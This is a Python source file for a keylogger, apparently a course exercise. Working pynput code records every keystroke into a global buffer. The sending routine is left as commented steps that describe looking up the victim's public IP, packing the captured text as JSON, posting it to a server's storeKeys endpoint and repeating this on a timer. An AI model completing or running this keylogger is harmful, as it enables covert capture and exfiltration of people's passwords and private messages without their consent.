from pynput import keyboard
from pynput.keyboard import Key, Listener
import requests
import json
import threading


text = 'Welcome to keylogger'

localhost = "127.0.0.1"
port_number = "4000"
# Time interval in seconds for code to execute.


# Function to get the IP address (boiler code)
def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address

# Define function sendPostReq

    # Access text as global
    
    # Add try block
    
        # Call get_ip_address() and store the returned value in ip_address variable
        
        # Print the Ip address
        
        # Replace "." with "-" in IP address as . will create firebase error
        
        # Create a python dict as {ip_address: text} and store it in data variable
        
        # Convert data to JSON and store it in payload variable
        
        # Create post request to Url of our server's storeKeys Path, also send payload as data and set "Content-Type" as application/json in headers.
        
        
        # Set up a timer function to run every <time_interval> specified seconds. sendPostReq is a recursive function, and will call itself as long as the program is running.
        
        # Call start() method from timer object.

    # Add except block
    
        # Print "Couldn't complete request!"


def onPress(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.cmd_r:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def onRelease(key):
    if key == Key.esc:
        return False


with Listener(on_press=onPress, on_release=onRelease) as listener:
    print("!!! WELCOME TO KEYLOGGER APP !!!")
    print("!!! APP IS READY TO LISTEN THE KEYS !!!")
    # Call sendPostReq() function
    
    listener.join()
